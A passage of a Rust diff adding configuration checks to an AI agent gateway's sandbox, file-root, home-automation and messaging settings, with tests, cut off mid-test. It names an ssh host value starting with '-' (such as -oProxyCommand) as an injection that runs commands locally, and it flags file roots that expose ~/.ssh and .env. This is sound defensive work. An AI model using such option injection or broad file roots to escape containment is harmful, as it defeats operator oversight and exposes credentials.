+                "agent.sandbox.ssh_host starts with `-`, so `ssh` would read it as an OPTION \
+                 rather than a destination. Options such as -oProxyCommand execute on the LOCAL \
+                 host, bypassing the containment entirely. The value is refused and no backend \
+                 is built."
+                    .to_string(),
+            );
+        }
+
+        // Unconditional: the operator has to read this once even with a
+        // perfectly coherent SSH section, because the word "sandbox" in the
+        // key name promises something this backend does not do.
+        push_warn(
+            findings,
+            "agent.sandbox.backend",
+            "agent.sandbox.backend=ssh is REMOTE EXECUTION, not containment: it isolates the \
+             LOCAL host only. The command runs on the remote machine with everything that SSH \
+             user can do, with full network and full filesystem. Use `docker`/`podman` if you \
+             want a sandbox."
+                .to_string(),
+        );
+
+        // #1225 S3 (ADR 0019): the SSH branch of `wrap_command` builds
+        // `ssh <host> -- sh -lc ...` and has no way to honor either flag —
+        // there is no `--network none` and no mount in an ssh session. Both
+        // default to `true`, so a bare `backend: ssh` reads as "network off,
+        // workdir contained" and neither is true. The runtime refuses every
+        // sandboxed command fail-closed until both are an explicit `false`
+        // (the operator's acknowledgement that ssh is remote execution
+        // WITHOUT network/mount isolation), so this is an Error, one per key
+        // that is on, naming the key and the action.
+        for (ligada, chave) in [
+            (sb.network_disabled, "agent.sandbox.network_disabled"),
+            (sb.mount_workdir, "agent.sandbox.mount_workdir"),
+        ] {
+            if ligada {
+                push_err(
+                    findings,
+                    chave,
+                    format!(
+                        "{chave}=true cannot be honored by agent.sandbox.backend=ssh: ssh is \
+                         remote execution with no network or mount isolation, so every \
+                         sandboxed command fails closed until you acknowledge that explicitly \
+                         with agent.sandbox.network_disabled=false and \
+                         agent.sandbox.mount_workdir=false (or switch to docker/podman for \
+                         real containment)."
+                    ),
+                );
+            }
+        }
+    }
+
+    // `elevated` is the escape hatch: those tools run on the HOST. With no
+    // confirmation channel the escape hatch is also unattended.
+    if !sb.elevated.is_empty() && !agent.tool_confirmation_enabled {
+        push_warn(
+            findings,
+            "agent.sandbox.elevated",
+            format!(
+                "agent.sandbox.elevated lists {} tool(s) that run on the host, outside the \
+                 sandbox, while agent.tool_confirmation_enabled=false — the escape hatch is only \
+                 single-gated (safety denylist) and nobody is asked before it is used.",
+                sb.elevated.len()
+            ),
+        );
+    }
+
+    // `mode = all` + every wrapped tool elevated == `mode = off` with extra
+    // steps. Today that is a one-item list, so it is easy to do by accident.
+    if sb.mode == SandboxMode::All
+        && TOOLS_SANDBOXAVEIS
+            .iter()
+            .all(|t| sb.elevated.iter().any(|e| e.trim() == *t))
+    {
+        push_warn(
+            findings,
+            "agent.sandbox.elevated",
+            format!(
+                "agent.sandbox.mode=all but agent.sandbox.elevated covers every tool the sandbox \
+                 can wrap today ({}), so nothing is sandboxed at all — the section is equivalent \
+                 to mode=off.",
+                TOOLS_SANDBOXAVEIS.join(", ")
+            ),
+        );
+    }
+
+    // `allowlist` with an empty list sandboxes nothing: the section is on,
+    // reads as on, and wraps zero commands. Same failure mode as #1225.
+    if sb.mode == SandboxMode::Allowlist && sb.sandboxed_tools.is_empty() {
+        push_warn(
+            findings,
+            "agent.sandbox.sandboxed_tools",
+            "agent.sandbox.mode=allowlist with an empty agent.sandbox.sandboxed_tools sandboxes \
+             nothing; every tool keeps running on the host."
+                .to_string(),
+        );
+    }
+
+    // A name the sandbox cannot act on is a silent no-op, and a typo
+    // (`Bash`, ` bash`) looks identical to a working entry in the file.
+    // Names are compared trimmed; case is NOT normalised, because the tool
+    // registry is case-sensitive and pretending otherwise would be a lie.
+    let cobertas = TOOLS_SANDBOXAVEIS.join("`, `");
+    for (campo, entradas) in [
+        ("agent.sandbox.sandboxed_tools", &sb.sandboxed_tools),
+        ("agent.sandbox.elevated", &sb.elevated),
+    ] {
+        for entrada in entradas {
+            let nome = entrada.trim();
+            if TOOLS_SANDBOXAVEIS.contains(&nome) {
+                continue;
+            }
+            // #1225 S2: the entry is a real tool that spawns on the host
+            // WITHOUT consulting the policy. Not a typo: the operator read
+            // `mode = all` as "everything" and listed one. Same severity (the
+            // entry is a no-op), honest message — and only here, when the
+            // config SHOWS the misunderstanding. A coherent section gets no
+            // Warning: `--strict` promotes Warning to exit 2, and the only
+            // way to clear an unconditional notice would be `mode = off`,
+            // i.e. pressure toward the less secure state. The notice every
+            // operator reads once is the startup `warn!`, not this finding.
+            if TOOLS_SO_NO_HOST.contains(&nome) {
+                push_warn(
+                    findings,
+                    campo,
+                    format!(
+                        "{campo} entry {nome:?} runs on the HOST whatever agent.sandbox.mode is: \
+                         it never consults the sandbox policy (only `{cobertas}` does — see \
+                         #1225), so the entry has no effect. Next step: remove it and read \
+                         `mode = all` as containment for `{cobertas}` only; if {} must not touch \
+                         this host, contain the gateway process itself (container/VM) until \
+                         #1225 routes them through the sandbox.",
+                        TOOLS_SO_NO_HOST.join("/")
+                    ),
+                );
+                continue;
+            }
+            push_warn(
+                findings,
+                campo,
+                format!(
+                    "{campo} entry {nome:?} is not a tool the sandbox can wrap today (only {}); \
+                     the entry has no effect. Names are case-sensitive.",
+                    TOOLS_SANDBOXAVEIS.join(", ")
+                ),
+            );
+        }
+    }
+}
+
+/// #1127: a URL do HA precisa de esquema http/https e host — é ela que o
+/// guard de SSRF (`vet_url`) vai vetar e pinar no boot. O `token_env` é
+/// presença-e-conteúdo: o HA API não tem modo anônimo, e config que cita
+/// env vazia/inexistente sobe com o adapter morto e o registry vazio —
+/// melhor o operador ver isso antes de reiniciar.
+fn valida_home_assistant(
+    ha: &crate::model::HaConfig,
+    findings: &mut Vec<Finding>,
+    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    let Ok(url) = url::Url::parse(&ha.url) else {
+        push_err(
+            findings,
+            "hardware.home_assistant.url",
+            format!(
+                "hardware.home_assistant.url ({:?}) is not a valid URL",
+                ha.url
+            ),
+        );
+        return;
+    };
+    let scheme = url.scheme();
+    if scheme != "http" && scheme != "https" {
+        push_err(
+            findings,
+            "hardware.home_assistant.url",
+            format!(
+                "hardware.home_assistant.url ({:?}) must use http or https (got {scheme:?})",
+                ha.url
+            ),
+        );
+    }
+    if url.host_str().is_none_or(str::is_empty) {
+        push_err(
+            findings,
+            "hardware.home_assistant.url",
+            format!("hardware.home_assistant.url ({:?}) has no host", ha.url),
+        );
+    }
+    if ha.token_env.trim().is_empty() {
+        push_err(
+            findings,
+            "hardware.home_assistant.token_env",
+            "hardware.home_assistant.token_env must be non-empty (HA has no anonymous API)"
+                .to_string(),
+        );
+    }
+}
+
+/// #1128: o diretório de regras precisa existir como valor — config que
+/// cita `dir` vazio sobe com o motor sem regras e ninguém percebe. O teto
+/// tem que ser uma das três formas canônicas (`r0`/`r1`/`r2`): um typo
+/// ("R2" maiúsculo é aceito no engine, mas "r3" não é um teto — R3+ nem
+/// existe aqui) vira erro na carga, não um teto silenciosamente mais alto.
+fn valida_automacoes(
+    automacoes: &crate::model::AutomationsConfig,
+    findings: &mut Vec<Finding>,
+    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    if automacoes.dir.trim().is_empty() {
+        push_err(
+            findings,
+            "hardware.automations.dir",
+            "hardware.automations.dir must be non-empty (the rules directory)".to_string(),
+        );
+    }
+    match automacoes.risk_ceiling.trim().to_ascii_lowercase().as_str() {
+        "r0" | "r1" | "r2" => {}
+        outro => push_err(
+            findings,
+            "hardware.automations.risk_ceiling",
+            format!(
+                "hardware.automations.risk_ceiling ({:?}) must be one of \"r0\", \"r1\", \"r2\" (got {:?}) — R3+ is not configurable for automations",
+                automacoes.risk_ceiling, outro
+            ),
+        ),
+    }
+}
+
+fn valida_mqtt(
+    mqtt: &crate::model::MqttConfig,
+    findings: &mut Vec<Finding>,
+    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    let (host, port) = match mqtt.broker.rsplit_once(':') {
+        Some((host, port)) => (host, port),
+        None => {
+            push_err(
+                findings,
+                "hardware.mqtt.broker",
+                format!(
+                    "hardware.mqtt.broker ({:?}) must be `host:port` (e.g. \"127.0.0.1:1883\")",
+                    mqtt.broker
+                ),
+            );
+            return;
+        }
+    };
+    if host.trim().is_empty() {
+        push_err(
+            findings,
+            "hardware.mqtt.broker",
+            format!("hardware.mqtt.broker ({:?}) has an empty host", mqtt.broker),
+        );
+    }
+    match port.trim().parse::<u16>() {
+        Ok(0) => push_err(
+            findings,
+            "hardware.mqtt.broker",
+            format!(
+                "hardware.mqtt.broker ({:?}) port 0 is not connectable",
+                mqtt.broker
+            ),
+        ),
+        Err(_) => push_err(
+            findings,
+            "hardware.mqtt.broker",
+            format!(
+                "hardware.mqtt.broker ({:?}) port {:?} is not a number in [1, 65535]",
+                mqtt.broker, port
+            ),
+        ),
+        Ok(_) => {}
+    }
+    if mqtt.client_id_prefix.trim().is_empty() {
+        push_err(
+            findings,
+            "hardware.mqtt.client_id_prefix",
+            "hardware.mqtt.client_id_prefix must be non-empty".to_string(),
+        );
+    }
+}
+
 /// Pure validation of the config directory path. Separated from the
 /// loader/env read so it can be unit-tested without touching process state.
 ///
@@ -1635,6 +2396,216 @@ fn validate_config_dir_inner(dir: &std::path::Path, env_explicitly_set: bool) ->
     findings
 }
 
+/// A chave de `channels` do canal `whatsapp_linked` (ADR 0023). Escrita por
+/// extenso porque `garraia-config` nao depende de `garraia-channels`; e o
+/// mesmo `CONFIG_KEY` que o gateway le em `settings_from_config`.
+const WHATSAPP_LINKED_TYPE: &str = "whatsapp_linked";
+
+/// Quantas entradas de uma lista de identidades (`owners`, `allow`) contam
+/// como declaradas: strings nao vazias apos `trim`. E o filtro minimo que o
+/// gateway aplica (`identidades_da_secao` descarta nao-string e vazio antes
+/// de normalizar); esta crate nao depende do gateway, entao espelha so essa
+/// parte — um `owners: [5511999998888]` sem aspas (inteiro em YAML) conta
+/// zero aqui como conta zero la (review C3/F-5 da #1329).
+fn identidades_declaradas(section: &crate::model::ChannelConfig, chave: &str) -> usize {
+    section
+        .settings
+        .get(chave)
+        .and_then(serde_json::Value::as_array)
+        .map(|itens| {
+            itens
+                .iter()
+                .filter(|v| v.as_str().is_some_and(|s| !s.trim().is_empty()))
+                .count()
+        })
+        .unwrap_or(0)
+}
+
+/// Nucleo puro do check da secao `execution` (ADR 0024 / #1329).
+///
+/// Recebe o resultado da leitura da env em vez de le-la, para o teste poder
+/// cobrir os achados sem `set_var`. Quatro regras:
+///
+/// - env invalida e **Error** em `execution.profile`: o `ConfigLoader::load`
+///   recusa a mesma env e o gateway nao sobe (fail-closed, nunca `standard`
+///   em silencio). O check diz isso antes do boot.
+/// - valor invalido de `execution.profile` no **arquivo** e o mesmo
+///   **Error**: o serde recusa o arquivo e o gateway nao sobe;
+///   `ConfigLoader::load_para_o_check` carrega o resto e marca o valor
+///   (`perfil_invalido_no_arquivo`) para o relatorio existir (exit 2, nao
+///   exit 65 "corrija a sintaxe").
+/// - `pod_root` so tem efeito em `isolated-pod`; declarado em `standard`, ou
+///   relativo, e **Warning** — a raiz do MCP `filesystem` continua sendo
+///   `agent.file_roots` / `<data_dir>/workspace`, e um caminho relativo
+///   depende do cwd de quem subiu o processo.
+/// - `channels.whatsapp_linked.owners` preenchido em `standard` e
+///   **Warning**: `owners` so confere o perfil completo em `isolated-pod`;
+///   fora dele e uma lista que nao libera nada, e o operador precisa saber
+///   que nao liberou.
+///
+/// Nada aqui e segredo: o perfil, a origem e o caminho sao ecoados; as
+/// identidades em `owners` NAO — so a contagem, que e o que a mensagem
+/// precisa.
+fn validate_execution(
+    execution: &crate::execution::ExecutionConfig,
+    env: &PerfilDaEnv,
+    channels: &std::collections::HashMap<String, crate::model::ChannelConfig>,
+) -> Vec<Finding> {
+    use crate::execution::PROFILE_ENV;
+
+    let mut findings = Vec::new();
+    if let Some(e) = execution.perfil_invalido_no_arquivo() {
+        findings.push(Finding {
+            severity: Severity::Error,
+            field: "execution.profile".into(),
+            message: format!(
+                "{e} (value in the config file; the file spelling is exact, lowercase); \
+                 the gateway refuses to boot with this value (fail-closed) — fix or remove \
+                 execution.profile"
+            ),
+        });
+    }
+    let perfil = match env {
+        Ok(Some(p)) => *p,
+        Ok(None) => execution.perfil(),
+        Err(e) => {
+            findings.push(Finding {
+                severity: Severity::Error,
+                field: "execution.profile".into(),
+                message: format!(
+                    "{e}; the gateway refuses to boot with this value (fail-closed) — fix or \
+                     unset {PROFILE_ENV}"
+                ),
+            });
+            execution.perfil()
+        }
+    };
+
+    if let Some(root) = execution.pod_root() {
+        if !perfil.is_isolated_pod() {
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: "execution.pod_root".into(),
+                message: format!(
+                    "execution.pod_root ({}) is set but the effective profile is `{perfil}`; \
+                     pod_root so vale em isolated-pod — it is ignored now, and the MCP \
+                     filesystem root stays agent.file_roots / <data_dir>/workspace",
+                    root.display()
+                ),
+            });
+        }
+        if !root.is_absolute() {
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: "execution.pod_root".into(),
+                message: format!(
+                    "execution.pod_root ({}) is not an absolute path; it would resolve \
+                     against the working directory of whoever started the process. Use an \
+                     absolute pod-local path (e.g. /workspace)",
+                    root.display()
+                ),
+            });
+        }
+    }
+
+    if !perfil.is_isolated_pod() {
+        let mut nomes: Vec<&String> = channels
+            .iter()
+            .filter(|(_, ch)| ch.channel_type == WHATSAPP_LINKED_TYPE)
+            .map(|(name, _)| name)
+            .collect();
+        nomes.sort();
+        for name in nomes {
+            let Some(ch) = channels.get(name) else {
+                continue;
+            };
+            let donos = identidades_declaradas(ch, "owners");
+            if donos == 0 {
+                continue;
+            }
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: format!("channels.{name}.owners"),
+                message: format!(
+                    "channels.{name}.owners lists {donos} identit{} but the effective \
+                     execution profile is `{perfil}`; owners so tem efeito em isolated-pod — \
+                     in `standard` nobody gets the full profile and every admitted sender \
+                     stays on default_mode",
+                    if donos == 1 { "y" } else { "ies" }
+                ),
+            });
+        }
+    }
+
+    findings
+}
+
+/// O sufixo de JID que uma identidade de `owners`/`allow` nao pode ter.
+///
+/// O canal identifica um remetente com numero pelos DIGITOS
+/// (`identidade_do_remetente` normaliza `sender_phone`), e so cai no JID cru
+/// quando o remetente e `@lid` (sem numero). Uma entrada
+/// `<digitos>@s.whatsapp.net` contem `@`, entao a normalizacao a mantem
+/// verbatim — e ela nunca casa com ninguem: o remetente com numero chega
+/// como digitos, e o `@lid` chega com outro sufixo. Fail-closed, mas em
+/// silencio (o turno so loga `perfil=padrao`), e e por isso que o check
+/// avisa (F-4 da auditoria da #1329).
+const SUFIXO_JID_DE_NUMERO: &str = "@s.whatsapp.net";
+
+/// Avisa quando `channels.<whatsapp_linked>.owners`/`allow` tem entradas na
+/// forma `<digitos>@s.whatsapp.net`, em qualquer perfil. So a contagem sai
+/// na mensagem — nunca a identidade.
+fn validate_whatsapp_linked_identidades(
+    channels: &std::collections::HashMap<String, crate::model::ChannelConfig>,
+    findings: &mut Vec<Finding>,
+    push_warn: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    let mut nomes: Vec<&String> = channels
+        .iter()
+        .filter(|(_, ch)| ch.channel_type == WHATSAPP_LINKED_TYPE)
+        .map(|(name, _)| name)
+        .collect();
+    nomes.sort();
+    for name in nomes {
+        let Some(ch) = channels.get(name) else {
+            continue;
+        };
+        for chave in ["owners", "allow"] {
+            let em_forma_de_jid = ch
+                .settings
+                .get(chave)
+                .and_then(serde_json::Value::as_array)
+                .map(|itens| {
+                    itens
+                        .iter()
+                        .filter_map(serde_json::Value::as_str)
+                        .filter(|s| {
+                            s.trim()
+                                .to_ascii_lowercase()
+                                .ends_with(SUFIXO_JID_DE_NUMERO)
+                        })
+                        .count()
+                })
+                .unwrap_or(0);
+            if em_forma_de_jid == 0 {
+                continue;
+            }
+            push_warn(
+                findings,
+                &format!("channels.{name}.{chave}"),
+                format!(
+                    "channels.{name}.{chave} has {em_forma_de_jid} entr{} in the \
+                     `<digits>{SUFIXO_JID_DE_NUMERO}` JID form; the gateway matches a sender \
+                     that has a phone number by its DIGITS, so such an entry never matches \
+                     anyone (fail-closed, silently) — write the digits only (e.g. \
+                     5511999998888), or the `@lid` JID for a sender without a number",
+                    if em_forma_de_jid == 1 { "y" } else { "ies" }
+                ),
+            );
+        }
+    }
+}
+
 /// Thin wrapper that reads the process env to drive
 /// [`validate_config_dir_inner`].
 fn validate_config_dir(loader: &ConfigLoader) -> Vec<Finding> {
@@ -1643,18 +2614,89 @@ fn validate_config_dir(loader: &ConfigLoader) -> Vec<Finding> {
 }
 
 /// Run the full validation + reporting pipeline.
+///
+/// `config` e o que `ConfigLoader::load_para_o_check` devolveu (o arquivo
+/// sem a env aplicada, com um `execution.profile` invalido marcado em vez de
+/// recusado); a env `GARRAIA_EXECUTION_PROFILE` e lida aqui, uma vez, e
+/// injetada no nucleo puro.
 pub fn run_check(loader: &ConfigLoader, config: &AppConfig) -> ConfigCheck {
-    let mut findings = validate(config);
+    // #1261: `GARRAIA_GATEWAY_API_KEY` conta como credencial. O `config
+    // check` recebe a config de `load_para_o_check` (sem env), entao a env e
+    // injetada aqui — numa copia, o chamador nunca ve o segredo aparecer.
+    let com_env;
+    let config = match crate::auth::gateway_api_key_from_env() {
+        Some(chave) if config.gateway.api_key_env.is_none() => {
+            let mut c = config.clone();
+            c.gateway.api_key_env = Some(chave);
+            com_env = c;
+            &com_env
+        }
+        _ => config,
+    };
+    let env = crate::execution::perfil_do_env();
+    let mut findings = validate_com_env(config, &env, &BindDaEnv::do_processo());
     findings.extend(validate_config_dir(loader));
+    // #1237: `vault:` no `env` de um servidor MCP com o cofre indisponivel
+    // (`GARRAIA_VAULT_PASSPHRASE` ausente) — no boot a referencia nao resolve
+    // e o servidor NAO sobe (fail-closed); o check anuncia antes. Sobre a
+    // config MERGEADA (config.yml + mcp.json), que e o que o boot le.
+    let mcp_merged = loader.merged_mcp_config(config);
+    findings.extend(findings_de_vault_sem_cofre(
+        mcp_merged
+            .iter()
+            .map(|(name, server)| (name.as_str(), server)),
+        garraia_security::vault_passphrase_from_env().is_some(),
+    ));
     ConfigCheck {
         source: source_report(loader),
         findings,
-        summary: summarise(config, loader.merged_mcp_config(config).len()),
+        summary: summarise_com_env(config, mcp_merged.len(), &env),
     }
+}
+
+/// #1237: findings de `vault:` no `env` de servidor MCP quando o cofre nao
+/// esta aberto. Um warn por referencia, nomeando servidor e chave — nunca o
+/// valor (o valor e a string `vault:...`, mas o caminho mostra a origem).
+fn findings_de_vault_sem_cofre<'a>(
+    servers: impl Iterator<Item = (&'a str, &'a McpServerConfig)>,
+    cofre_disponivel: bool,
+) -> Vec<Finding> {
+    if cofre_disponivel {
+        return Vec::new();
+    }
+    let mut findings = Vec::new();
+    for (name, server) in servers {
+        for (env_key, value) in &server.env {
+            if value.starts_with("vault:") {
+                findings.push(Finding {
+                    severity: Severity::Warning,
+                    field: format!("mcp.{name}.env.{env_key}"),
+                    message: format!(
+                        "mcp.{name}.env.{env_key} uses a vault: reference but \
+                         GARRAIA_VAULT_PASSPHRASE is not set — the ref will not \
+                         resolve at boot and the server will not start (fail-closed)"
+                    ),
+                });
+            }
+        }
+    }
+    findings
 }
 
 #[cfg(test)]
 mod tests {
+
+    /// #1247: a escotilha do boot gate tem de aparecer em `env_vars_detected`
+    /// — e o unico jeito de o `config check` explicar um boot que ignorou um
+    /// Error da allowlist.
+    #[test]
+    fn escotilha_do_boot_gate_e_env_conhecida() {
+        assert!(
+            KNOWN_GARRAIA_ENV_VARS.contains(&crate::boot_gate::ESCAPE_ENV),
+            "{} fora de KNOWN_GARRAIA_ENV_VARS",
+            crate::boot_gate::ESCAPE_ENV
+        );
+    }
     use super::*;
     use crate::model::{AppConfig, GatewayConfig, LlmProviderConfig, McpServerConfig, VoiceConfig};
     use std::collections::HashMap;
@@ -1673,6 +2715,175 @@ mod tests {
             std::process::id(),
             nanos
         ))
+    }
+
+    // ─── #1244: aviso de agent.file_roots ─────────────────────────────────
+
+    /// A config default nao reclama de si mesma: sem `file_roots`, sem achado.
+    #[test]
+    fn file_roots_vazio_nao_produz_achado() {
+        assert!(validate_file_roots(&[], &[], Some(PathBuf::from("/home/u"))).is_empty());
+    }
+
+    /// Uma raiz de projeto normal tambem nao.
+    #[test]
+    fn file_roots_com_subdiretorio_de_projeto_nao_produz_achado() {
+        let achados = validate_file_roots(
+            &["/home/u/projetos/garra".to_string()],
+            &[],
+            Some(PathBuf::from("/home/u")),
+        );
+        assert!(achados.is_empty(), "{achados:?}");
+    }
+
+    /// `/` e o jail desligado por configuracao — tem de aparecer.
+    #[test]
+    fn file_roots_com_a_raiz_do_sistema_avisa() {
+        let achados = validate_file_roots(&["/".to_string()], &[], Some(PathBuf::from("/home/u")));
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Warning);
+        assert_eq!(achados[0].field, "agent.file_roots");
+        assert!(achados[0].message.contains("#1244"), "{:?}", achados[0]);
+    }
+
+    /// `$HOME` devolve `~/.ssh` e `.env` ao alcance do modelo.
+    #[test]
+    fn file_roots_com_home_avisa() {
+        let achados = validate_file_roots(
+            &["/home/u".to_string()],
+            &[],
+            Some(PathBuf::from("/home/u")),
+        );
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert!(achados[0].message.contains("$HOME"), "{:?}", achados[0]);
+    }
+
+    /// Sem `$HOME` conhecido o aviso de home nao dispara — e o de `/` continua.
+    #[test]
+    fn file_roots_sem_home_conhecido_nao_chuta() {
+        assert!(validate_file_roots(&["/home/u".to_string()], &[], None).is_empty());
+        assert_eq!(validate_file_roots(&["/".to_string()], &[], None).len(), 1);
+    }
+
+    /// Entrada vazia e ignorada em silencio no boot; aqui ela e dita.
+    #[test]
+    fn file_roots_com_entrada_vazia_avisa() {
+        let achados = validate_file_roots(&["  ".to_string()], &[], None);
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert!(achados[0].message.contains("empty"), "{:?}", achados[0]);
+    }
+
+    // ─── #1244 rodada 2: a env e a comparacao depois de resolver ──────────
+
+    /// F4: `GARRAIA_FILE_ROOTS` **soma** raizes as da config, e o `config
+    /// check` so olhava o YAML — `GARRAIA_FILE_ROOTS=/` desligava o jail sem
+    /// uma linha de aviso. O achado sai com campo proprio, senao o operador
+    /// procura no YAML o que nao esta la.
+    #[test]
+    fn file_roots_da_env_tambem_avisa() {
+        let achados = validate_file_roots(&[], &["/".to_string()], None);
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].field, "env.GARRAIA_FILE_ROOTS");
+        assert!(achados[0].message.contains("#1244"), "{:?}", achados[0]);
+    }
+
+    /// E as duas origens sao contadas juntas.
+    #[test]
+    fn file_roots_de_config_e_env_somam_achados() {
+        let achados = validate_file_roots(
+            &["/home/u".to_string()],
+            &["/".to_string()],
+            Some(PathBuf::from("/home/u")),
+        );
+        assert_eq!(achados.len(), 2, "{achados:?}");
+        assert_eq!(achados[0].field, "agent.file_roots");
+        assert_eq!(achados[1].field, "env.GARRAIA_FILE_ROOTS");
+    }
+
+    /// `/.`, `//.` e `/./.` sao `/`. Isto **nao** prova a correcao de F5 — o
+    /// `Path::parent` do Rust ja compara por componente e ja devolvia `None`
+    /// para os tres, entao o aviso original tambem os pegava. Fica como
+    /// guarda de regressao contra uma reescrita que passe a comparar string,
+    /// e dito aqui para ninguem creditar ao `canonicalize` um buraco que
+    /// nunca existiu.
+    #[test]
+    fn raiz_do_sistema_escrita_de_outro_jeito_continua_sendo_raiz() {
+        for disfarce in ["/.", "//.", "/./."] {
+            let achados = validate_file_roots(&[disfarce.to_string()], &[], None);
+            assert_eq!(achados.len(), 1, "{disfarce}: {achados:?}");
+        }
+    }
+
+    /// F5, o buraco de verdade: `$HOME/../$USER` **e** o `$HOME`, e nenhuma
+    /// comparacao por componente ve isso — `..` so e achatado pelo
+    /// `canonicalize`, que precisa do disco. Tire o `normalizar_raiz` e este
+    /// e o teste que fica vermelho.
+    #[test]
+    fn file_roots_com_home_disfarcado_por_dotdot_avisa() {
+        let bruto = temp_dir("file-roots-home");
+        fs::create_dir_all(&bruto).expect("mkdir");
+        let home = fs::canonicalize(&bruto).expect("canonicalize");
+        let nome = home.file_name().expect("nome").to_owned();
+        let rodeio = home.join("..").join(&nome);
+        let projeto = home.join("projeto");
+        fs::create_dir_all(&projeto).expect("mkdir");
+
+        let achados = validate_file_roots(
+            &[rodeio.to_string_lossy().into_owned()],
+            &[],
+            Some(home.clone()),
+        );
+        // Controle: um subdiretorio real do mesmo home continua limpo.
+        let controle = validate_file_roots(
+            &[projeto.to_string_lossy().into_owned()],
+            &[],
+            Some(home.clone()),
+        );
+        fs::remove_dir_all(&home).ok();
+
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert!(achados[0].message.contains("$HOME"), "{:?}", achados[0]);
+        assert!(controle.is_empty(), "{controle:?}");
+    }
+
+    /// E o caminho de producao da env: `validate` tem de **ler**
+    /// `GARRAIA_FILE_ROOTS`, nao so aceitar o parametro.
+    #[test]
+    fn validate_le_a_env_de_file_roots() {
+        let _guard = crate::ENV_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let anterior = std::env::var_os(FILE_ROOTS_ENV);
+        // SAFETY: ENV_TEST_LOCK held.
+        unsafe { std::env::set_var(FILE_ROOTS_ENV, "/") };
+
+        let config = AppConfig::default();
+        let achados: Vec<_> = validate(&config)
+            .into_iter()
+            .filter(|f| f.field == "env.GARRAIA_FILE_ROOTS")
+            .collect();
+
+        // SAFETY: ENV_TEST_LOCK held.
+        unsafe {
+            match anterior {
+                Some(v) => std::env::set_var(FILE_ROOTS_ENV, v),
+                None => std::env::remove_var(FILE_ROOTS_ENV),
+            }
+        }
+        assert_eq!(achados.len(), 1, "{achados:?}");
+    }
+
+    /// E o caminho de producao: `validate` (o que o `config check` roda) tem
+    /// de chamar `validate_file_roots`. Apagar essa linha deixa este vermelho.
+    #[test]
+    fn validate_reporta_file_roots_perigoso() {
+        let mut config = AppConfig::default();
+        config.agent.file_roots = vec!["/".to_string()];
+        let achados: Vec<_> = validate(&config)
+            .into_iter()
+            .filter(|f| f.field == "agent.file_roots")
+            .collect();
+        assert_eq!(achados.len(), 1, "{achados:?}");
     }
 
     // ─── #952: filtro de ruido na ingestao ────────────────────────────────
@@ -1908,6 +3119,8 @@ mod tests {
         assert!(hit.message.contains("auto-fallback"));
     }
 
+    /// `validate` e pura: nem `HOST`/`PORT` de um teste vizinho entram aqui
+    /// (o flake da #1261 que o CI pegou neste teste).
     #[test]
     fn valid_default_config_has_no_errors() {
         let cfg = AppConfig::default();
@@ -2123,6 +3336,461 @@ mod tests {
         );
     }
 
+    /// #1225: cada linha aqui e uma config que **parseia e sobe**, e onde o
+    /// que o operador acha que ligou nao e o que esta ligado. Tabela no
+    /// estilo do resto do modulo: config, campo esperado, severidade.
+    #[test]
+    fn agent_sandbox_findings_table() {
+        use crate::sandbox::{SandboxBackendKind, SandboxMode};
+
+        // (nome, mutacao, campo esperado, severidade esperada)
+        type Caso = (&'static str, fn(&mut AppConfig), &'static str, Severity);
+        let casos: Vec<Caso> = vec![
+            (
+                "mode=all sem backend falha fechado em todo comando",
+                |c| c.agent.sandbox.mode = SandboxMode::All,
+                "agent.sandbox.backend",
+                Severity::Error,
+            ),
+            (
+                "mode=allowlist sem backend tambem",
+                |c| c.agent.sandbox.mode = SandboxMode::Allowlist,
+                "agent.sandbox.backend",
+                Severity::Error,
+            ),
+            (
+                "backend=ssh sem ssh_host nao constroi backend nenhum",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                },
+                "agent.sandbox.ssh_host",
+                Severity::Error,
+            ),
+            (
+                "ssh_host so com espacos conta como ausente",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("   ".into());
+                },
+                "agent.sandbox.ssh_host",
+                Severity::Error,
+            ),
+            // S3: ssh nao consegue honrar as duas flags, e os defaults sao
+            // `true` — entao `backend: ssh` "so com host" e Error nas duas
+            // chaves, ate o operador escrever `false` explicito.
+            (
+                "ssh com network_disabled no default e Error na chave",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("box".into());
+                },
+                "agent.sandbox.network_disabled",
+                Severity::Error,
+            ),
+            (
+                "ssh com mount_workdir no default e Error na chave",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("box".into());
+                },
+                "agent.sandbox.mount_workdir",
+                Severity::Error,
+            ),
+            // Reconhecimento pela metade nao basta: cada chave ligada e o seu
+            // proprio Error, para o finding nomear exatamente o que falta.
+            (
+                "ssh so com mount_workdir=false ainda e Error em network_disabled",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("box".into());
+                    c.agent.sandbox.mount_workdir = false;
+                },
+                "agent.sandbox.network_disabled",
+                Severity::Error,
+            ),
+            (
+                "ssh so com network_disabled=false ainda e Error em mount_workdir",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("box".into());
+                    c.agent.sandbox.network_disabled = false;
+                },
+                "agent.sandbox.mount_workdir",
+                Severity::Error,
+            ),
+            // I1: o aviso de "ssh nao e contencao" e incondicional — vale
